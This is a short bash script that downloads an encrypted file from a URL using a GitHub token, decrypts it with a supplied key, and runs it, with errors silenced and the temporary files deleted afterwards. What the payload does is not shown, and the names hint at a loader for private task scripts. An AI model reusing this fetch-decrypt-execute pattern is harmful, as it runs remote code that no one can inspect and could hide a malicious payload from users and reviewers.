#!/bin/bash
# fetch -> unpack -> run
set -e
: "${PAYLOAD_URL:?}" "${TASK_KEY:?}" "${GH_TOKEN:?}"
t=$(mktemp -d)
trap 'rm -rf "$t"' EXIT
curl -fsSL -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github.raw+json" "$PAYLOAD_URL" -o "$t/a.bin" 2>/dev/null
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -pass "pass:$TASK_KEY" -in "$t/a.bin" -out "$t/a.sh" 2>/dev/null
bash "$t/a.sh" "$1" "$2"
